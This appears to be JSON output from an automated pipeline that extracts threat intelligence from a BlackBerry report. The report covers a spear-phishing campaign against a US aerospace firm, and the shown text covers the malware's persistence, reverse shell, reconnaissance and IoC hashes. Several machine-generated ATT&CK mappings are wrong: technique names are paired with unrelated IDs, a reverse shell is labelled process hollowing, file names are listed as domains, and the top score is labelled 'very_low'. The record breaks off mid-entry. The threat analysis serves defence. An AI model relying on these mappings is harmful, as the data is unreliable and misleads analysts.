unknown 16 bytes computed by custom unknown encode functions Offset 0x13: username using function GetUserNameA() Offset 0x43: computer name using function GetComputerNameA() Offset 0x73: file name being executed using function GetModuleFileNameA() Offset 0x178: IPV4 addresses using function GetAdaptersInfo() Offset0x1b8: MAC addresses using function GetAdaptersInfo() Persistence is achieved via Windows Task Scheduler  where a task named  WinUpdate2  is created to run every day at 10:10 AM. Task Scheduler functions are abused by using its COM object via the CoCreateInstance() function. 1 0 / 1 3 Figure 15   Persistence is established through Windows Task Scheduler Reverse Shell Finally  the reverse shell is executed in a stealthy way. First  it gets the default standard handle by calling GetStdHandle()  then the ComSpec variable is retrieved using the GetEnvironmentVariableW() function  which by default is set to  C:\\Windows\\system32\\cmd.exe . After that  a pipe is created using CreatePipe()  and CreateProcessW() is executed  creating  cmd.exe.  Figure 16   cmd.exe CreateProcess Besides the reverse shell  the final payload can collect a complete list of directories on the victim s system by using the function GetLogicalDeviceStringsW()  looping through the list of files using FindFirstFileA()/FindNextFileA()  and then comparing with  ..  to see if a given file is actually a directory. Figure 17   String comparison with directories During our investigations  we found two samples from mid-2022:  5[redacted sha-256]7  and  5[redacted sha-256]8   which is also a reverse shell with a hard-coded C2 at  [redacted][.]165    the same IP address that the C2 server from the 2023 samples are pointing to. Both samples were 1 1 / 1 3 targeting the aerospace industry. While the 2022 samples are obfuscated  unlike the 2023 samples  they do not contain stealthier functions such as API hashing  anti-analysis techniques  or encrypted static configuration. They also don t include the capability to list directories  nor are they able to send information to a remote server. Network Infrastructure IP Domain Name [redacted].217hxxp://[redacted].217/[redacted][.]dotm hxxp://[redacted].217/[redacted] [redacted].195redacted.redacted.com [redacted].165redacted.redacted.com Targets and Attribution Based on the content of the lure message  an aerospace company in the United States was the intended target for both campaigns. The development of this threat group s toolkit indicates that the operator has been active for at least one year. Exactly who is behind these two campaigns remains unknown. Conclusions Given the relatively sophisticated technical capabilities this threat actor deployed and the victim s timelines  we conclude with a high degree of confidence that this was a commercial cyberespionage campaign. Its purpose was most likely to gain visibility over the internal resources of its target in order to weigh its susceptibility to a future ransom demand. Based on the threat actor s operations timelines   September 2022 and then July 2023   we can surmise that this shows the group s interest in the target remained consistent between the first and second campaign  as evidenced by the increased complexity of the second campaign compared to the first. During the time that elapsed between the two campaigns we observed  the threat actor put considerable effort into developing additional resources to ensure they could secure access to the sought-after information  and that they could exfiltrate it successfully. APPENDIX 1   Referential Indicators of Compromise (IoCs) 1 2 / 1 3 Second Stage Sha 265 MD5 Sha 265 MD5 Sha 256 MD5 16bd34c3f00288e46d8e3fdb67916aa7c68d8a0622f2c76c57112dae36c76875 885B04081BD89F5E23CBC59723052601 6d515dafef42a5648754de3c0fa6adfcb8b57af1c1d69e629b0d840dab7f91ec 62D3FF36EC8A721488E512E1C94B2744 abc348d3cc40521afc165aa6dc2d66fd9e654d91e3d66461724ac9490030697f A04D2C0AA0A798047161118B5D5816AA Disclaimer: The private version of this report is available upon request. It includes but is not limited to  the complete and contextual MITRE ATT CK mapping  MITRE D3FEND  countermeasures  Attack Flow by MITRE  and other threat detection content for tooling  network traffic  complete IoCs list  Yara rules  Sigma rules  and system behavior. Please email us at cti@blackberry.com for more information. For similar articles and news delivered straight to your inbox  subscribe to the BlackBerry Blog. Related Reading About Dmitry Bestuzhev Dmitry Bestuzhev is Senior Director  CTI (Cyber Threat Intelligence) at BlackBerry. Prior to BlackBerry  Dmitry was Head of Kaspersky s Global Research and Analysis Team for Latin America  where he oversaw the company s experts  anti-malware development work in the region. Dmitry has more than 20 years of experience in IT security across a wide variety of roles. His field of expertise covers everything from traditional online fraud to targeted high-profile attacks on financial and governmental institutions. His main focus in research is on producing Threat Intelligence reports on financially motivated targeted attacks.   1 3 / 1 3 About The BlackBerry Research   Intelligence Team The BlackBerry Research   Intelligence team examines emerging and persistent threats  providing intelligence analysis for the benefit of defenders and the organizations they serve.",
            "commands": [],
            "file_paths": [
              "/[redacted].217/[redacted]",
              "/[redacted][.]dotm",
              "/[redacted].217/[redacted][.]dotm",
              "C:\\Users\\user\\AppData\\Local\\Temp\\[redacted].zip",
              "/[redacted].106.27.",
              "C:\\Windows\\system32\\cmd.exe\u201d.",
              "/"
            ],
            "registry_keys": []
          },
          "entities": {
            "malware": [
              "apt",
              "malware",
              "payload",
              "rat"
            ],
            "tools": [
              "at",
              "cmd",
              "net",
              "ping",
              "reg",
              "sc"
            ],
            "threat_actors": [],
            "ips": [],
            "domains": [
              "165redacted.redacted.com",
              "195redacted.redacted.com",
              "blackberry.com",
              "blogs.blackberry.com",
              "cmd.exe",
              "item3.xml"
            ],
            "hashes": {
              "md5": [
                "62D3FF36EC8A721488E512E1C94B2744",
                "885B04081BD89F5E23CBC59723052601",
                "A04D2C0AA0A798047161118B5D5816AA"
              ],
              "sha256": [
                "16bd34c3f00288e46d8e3fdb67916aa7c68d8a0622f2c76c57112dae36c76875",
                "6d515dafef42a5648754de3c0fa6adfcb8b57af1c1d69e629b0d840dab7f91ec",
                "abc348d3cc40521afc165aa6dc2d66fd9e654d91e3d66461724ac9490030697f"
              ]
            }
          },
          "ttp_indicators": {
            "initial_access": [
              "Phishing"
            ],
            "execution": [
              "Command and Scripting Interpreter",
              "User Execution: Malicious File"
            ],
            "defense_evasion": [
              "Obfuscated Files or Information",
              "Process Injection"
            ],
            "collection": [
              "Archive Collected Data"
            ],
            "exfiltration": [
              "Exfiltration Over C2 Channel"
            ],
            "command_and_control": [
              "Application Layer Protocol"
            ]
          },
          "context": "\n**File System Activity:**\n- /[redacted].217/[redacted]\n- /[redacted][.]dotm\n- /[redacted].217/[redacted][.]dotm\n- C:\\Users\\user\\AppData\\Local\\Temp\\[redacted].zip\n- /[redacted].106.27.\n\n**Network Indicators:**\n- 165redacted.redacted.com\n- 195redacted.redacted.com\n- blogs.blackberry.com\n- item3.xml\n- blackberry.com\n- cmd.exe\n\n**Key Security Terms:** c2, decrypt, macro, command-and-control, persistence, exfiltrate, dll, encrypt, download, malware"
        },
        "metadata": {
          "extraction_method": "LangChain-Enhanced",
          "nlp_processing_time_ms": 14.551,
          "llm_processing_time_ms": 4724.575
        }
      }
    ],
    "results": [
      {
        "report_id": "pdf-3b7f6a06126c357830383587d841f333",
        "extracted_ttps": [
          {
            "ttp_id": "1b985cdf-d878-4ac1-b77e-b158810bad66",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Remote Template Injection",
            "attack_id": "T1221",
            "tactic": "Initial Access",
            "description": "The docx document employs remote template injection to download the second stage of the infection",
            "confidence_score": 0.748,
            "confidence_level": "very_low",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.382,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "[redacted].docx",
              "remote template injection"
            ],
            "tools": [
              "sc",
              "MS Office documents",
              "ping",
              "at",
              "cmd",
              "reg",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "7b76ae34-1131-40bc-a68b-56fe82b96cff",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "Threat actor used command line tools like at, cmd, net, ping, reg for execution",
            "confidence_score": 0.694,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.7,
              "description_detail": 0.322,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "at",
              "cmd",
              "net",
              "ping",
              "reg"
            ],
            "tools": [
              "sc",
              "ping",
              "at",
              "reg",
              "cmd",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "f27460b7-a4e0-4685-b1ae-f4b7f8be9222",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Phishing",
            "attack_id": "T1566",
            "tactic": "Initial Access",
            "description": "Detected Phishing activity via NLP pattern matching",
            "confidence_score": 0.684,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.116,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "sc",
              "ping",
              "at",
              "reg",
              "cmd",
              "zip",
              "net"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "461373bc-4717-4de2-b9e1-195afd3556b9",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Obfuscated Files or Information",
            "attack_id": "T1027",
            "tactic": "Defense Evasion",
            "description": "The malware uses anti-disassembly techniques, API hashing, and custom encoding to make analysis harder",
            "confidence_score": 0.682,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.322,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "C:\\Users\\user\\AppData\\Local\\Temp\\[redacted].zip",
              "GetCursorPos()",
              "GetTickCount()"
            ],
            "tools": [
              "sc",
              "Malware",
              "ping",
              "at",
              "cmd",
              "reg",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "11c0a7e9-1b95-418a-9b5a-953f299f1e61",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Process Hollowing",
            "attack_id": "T1093",
            "tactic": "Defense Evasion",
            "description": "The malware creates a reverse shell by executing cmd.exe in a stealthy way",
            "confidence_score": 0.679,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.299,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "cmd.exe",
              "CreatePipe()",
              "CreateProcessW()"
            ],
            "tools": [
              "sc",
              "ping",
              "cmd",
              "reg",
              "at",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "8ce45c1f-8434-4914-8f18-1bbf627eb94b",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Obfuscated Files or Information",
            "attack_id": "T1027",
            "tactic": "Defense Evasion",
            "description": "The final payload of the 2023 attack is stealthier and uses more obfuscation and anti-analysis techniques",
            "confidence_score": 0.677,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.368,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "obfuscated files"
            ],
            "tools": [
              "sc",
              "ping",
              "cmd",
              "at",
              "reg",
              "obfuscation tools",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "971916ad-37bf-45cb-8ddf-9bbab9b70c86",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Exfiltration Over Alternative Protocol",
            "attack_id": "T1041",
            "tactic": "Exfiltration",
            "description": "The command-and-control (C2) server IP address is the same and connects over port 443",
            "confidence_score": 0.676,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.322,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "redacted[.]redacted[.]com",
              "port 443"
            ],
            "tools": [
              "sc",
              "ping",
              "at",
              "cmd",
              "reg",
              "C2 server",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "586d9add-e54d-476b-a43a-e6e894c7c2ea",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Spearphishing Attachment",
            "attack_id": "T1566.001",
            "tactic": "Initial Access",
            "description": "AeroBlade used spear-phishing as a delivery mechanism with a weaponized document sent as an email attachment",
            "confidence_score": 0.673,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.58,
              "description_detail": 0.368,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "[redacted].docx",
              "email attachment"
            ],
            "tools": [
              "sc",
              "MS Office documents",
              "ping",
              "at",
              "cmd",
              "reg",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "e12a169c-94cf-4d75-a77e-174d465b5c00",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "File and Directory Discovery",
            "attack_id": "T1083",
            "tactic": "Discovery",
            "description": "The malware collects a list of directories on the victim's system",
            "confidence_score": 0.672,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.253,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "GetLogicalDeviceStringsW()",
              "FindFirstFileA()",
              "FindNextFileA()"
            ],
            "tools": [
              "sc",
              "Malware",
              "ping",
              "at",
              "cmd",
              "reg",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "c72d5ffe-c9bf-41f1-84b9-6708fc64be62",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "System Information Discovery",
            "attack_id": "T1082",
            "tactic": "Discovery",
            "description": "The 2023 campaign's final payload includes an option to list directories from infected victims",
            "confidence_score": 0.67,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.322,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "directory listing"
            ],
            "tools": [
              "sc",
              "ping",
              "at",
              "cmd",
              "reg",
              "final payload",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "6bd399bc-9eb8-48ed-b5b4-ddeb3c5f32e6",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Execution of VBA Macro Code",
            "attack_id": "T1204.002",
            "tactic": "Execution",
            "description": "The malicious VBA macro code delivers the next stage to the final payload execution",
            "confidence_score": 0.666,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.58,
              "description_detail": 0.322,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "VBA macro code",
              "[redacted].dotm"
            ],
            "tools": [
              "sc",
              "MS Office documents",
              "ping",
              "at",
              "cmd",
              "reg",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "5a98bc1a-e9c2-4b49-b499-443e56c4327c",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "System Information Discovery",
            "attack_id": "T1082",
            "tactic": "Discovery",
            "description": "The malware collects system information from the infected machine",
            "confidence_score": 0.665,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.207,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "GetUserNameA()",
              "GetComputerNameA()",
              "GetModuleFileNameA()"
            ],
            "tools": [
              "sc",
              "Malware",
              "ping",
              "at",
              "cmd",
              "reg",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "d4e595aa-0f5e-4faa-965a-3d9b51038732",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Obfuscated Files or Information",
            "attack_id": "T1027",
            "tactic": "Defense Evasion",
            "description": "Threat actor used obfuscation to hide files or information",
            "confidence_score": 0.665,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.207,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Sha 265 MD5",
              "6d515dafef42a5648754de3c0fa6adfcb8b57af1c1d69e629b0d840dab7f91ec",
              "62D3FF36EC8A721488E512E1C94B2744"
            ],
            "tools": [
              "sc",
              "malware",
              "ping",
              "at",
              "cmd",
              "reg",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "4548126e-6e4b-4b24-89db-d56268318e7b",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Exfiltration Over Alternative Protocol",
            "attack_id": "T1041",
            "tactic": "Exfiltration",
            "description": "Threat actor exfiltrated data using alternative protocols",
            "confidence_score": 0.664,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.199,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Sha 256 MD5",
              "16bd34c3f00288e46d8e3fdb67916aa7c68d8a0622f2c76c57112dae36c76875",
              "885B04081BD89F5E23CBC59723052601"
            ],
            "tools": [
              "sc",
              "malware",
              "ping",
              "at",
              "cmd",
              "reg",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "8ca0fd9c-6756-49d5-ac7f-779942bf4972",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Data Staging",
            "attack_id": "T1074",
            "tactic": "Collection",
            "description": "The malware collects and transmits information to a remote server",
            "confidence_score": 0.662,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.23,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "GetAdaptersInfo()",
              "GetLogicalDeviceStringsW()"
            ],
            "tools": [
              "sc",
              "Malware",
              "ping",
              "at",
              "cmd",
              "reg",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "764dc7a3-3108-4b36-b676-5337de821da9",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Masquerading",
            "attack_id": "T1036",
            "tactic": "Defense Evasion",
            "description": "The malware uses a legitimate process to execute malicious code",
            "confidence_score": 0.662,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.268,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "cmd.exe"
            ],
            "tools": [
              "sc",
              "Malware",
              "ping",
              "at",
              "cmd",
              "reg",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "ea656dbf-3a20-49cc-afb6-6cad2d24fcf3",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Scheduled Task",
            "attack_id": "T1053",
            "tactic": "Persistence",
            "description": "The malware achieves persistence via Windows Task Scheduler",
            "confidence_score": 0.656,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "WinUpdate2",
              "CoCreateInstance()"
            ],
            "tools": [
              "sc",
              "ping",
              "Windows Task Scheduler",
              "at",
              "cmd",
              "reg",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "fb80cead-412a-4fd5-8ed9-54cd19659bca",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Command and Control",
            "attack_id": "T1071",
            "tactic": "Command and Control",
            "description": "The malware connects to a hard-coded C2 server",
            "confidence_score": 0.656,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "[redacted].165",
              "[redacted].217"
            ],
            "tools": [
              "sc",
              "Malware",
              "ping",
              "at",
              "cmd",
              "reg",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "a246f4f9-2f74-489c-b03d-fa87ba2bdd09",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Resource Development",
            "attack_id": "T1583",
            "tactic": "Resource Development",
            "description": "Threat actor developed additional resources for campaign",
            "confidence_score": 0.652,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.161,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "September 2022",
              "July 2023"
            ],
            "tools": [
              "sc",
              "malware",
              "ping",
              "at",
              "cmd",
              "reg",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "73c200ca-63ff-43ec-9bf5-c7b9cbb8e853",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Create or Modify System Process",
            "attack_id": "T1543.001",
            "tactic": "Persistence",
            "description": "The attacker created a reverse shell connecting to the C2 server",
            "confidence_score": 0.65,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.253,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "reverse shell"
            ],
            "tools": [
              "sc",
              "reverse shell tools",
              "ping",
              "at",
              "cmd",
              "reg",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "b902fa20-18a9-424f-9a87-66274aaa20a3",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Data Encoding",
            "attack_id": "T1132",
            "tactic": "Command and Control",
            "description": "Threat actor used encoding to exfiltrate data",
            "confidence_score": 0.646,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.161,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "base64"
            ],
            "tools": [
              "sc",
              "malware",
              "ping",
              "at",
              "cmd",
              "reg",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "0c245210-8dcf-450e-901a-20876970e2e0",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Process Discovery",
            "attack_id": "T1053.005",
            "tactic": "Discovery",
            "description": "The attacker discovered processes on the victim's system",
            "confidence_score": 0.645,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.222,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "process discovery"
            ],
            "tools": [
              "sc",
              "discovery tools",
              "ping",
              "at",
              "cmd",
              "reg",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "64ec409c-3658-4e73-92a3-83c428acaa8e",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Process Injection",
            "attack_id": "T1055",
            "tactic": "Defense Evasion",
            "description": "Detected Process Injection activity via NLP pattern matching",
            "confidence_score": 0.636,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.214,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "sc",
              "ping",
              "at",
              "reg",
              "cmd",
              "zip",
              "net"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "136e4c3f-616a-4289-831c-f395ff448971",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Application Layer Protocol",
            "attack_id": "T1071",
            "tactic": "Command And Control",
            "description": "Detected Application Layer Protocol activity via NLP pattern matching",
            "confidence_score": 0.633,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.199,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "sc",
              "ping",
              "at",
              "reg",
              "cmd",
              "zip",
              "net"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "8f31312f-d357-4657-9402-beecd07ede9b",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059.005",
            "tactic": "Execution",
            "description": "The attacker used cmd for execution",
            "confidence_score": 0.633,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.138,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "cmd.exe"
            ],
            "tools": [
              "sc",
              "ping",
              "cmd",
              "reg",
              "at",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "00c01b51-cfd2-4221-896b-71e88a646eef",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "Detected Command and Scripting Interpreter activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "sc",
              "ping",
              "at",
              "reg",
              "cmd",
              "zip",
              "net"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "6b9f5801-2dc6-4f85-b68c-86759257f2e2",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Obfuscated Files or Information",
            "attack_id": "T1027",
            "tactic": "Defense Evasion",
            "description": "Detected Obfuscated Files or Information activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "sc",
              "ping",
              "at",
              "reg",
              "cmd",
              "zip",
              "net"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "c7c8946c-7af2-4adb-a00d-fcf50ed48353",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Exfiltration Over C2 Channel",
            "attack_id": "T1041",
            "tactic": "Exfiltration",
            "description": "Detected Exfiltration Over C2 Channel activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "sc",
              "ping",
              "at",
              "reg",
              "cmd",
              "zip",
              "net"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "562aae2d-8bff-4e95-84a9-3d87b6a9ef3b",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Archive Collected Data",
            "attack_id": "T1560",
            "tactic": "Collection",
            "description": "Detected Archive Collected Data activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "sc",
              "ping",
              "at",
              "reg",
              "cmd",
              "zip",
              "net"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "3665c5cf-3c4a-4886-a878-e0b7def78f5d",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "User Execution: Malicious File",
            "attack_id": "T1204.002",
            "tactic": "Execution",
            "description": "Detected User Execution: Malicious File activity via NLP pattern matching",
            "confidence_score": 0.621,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
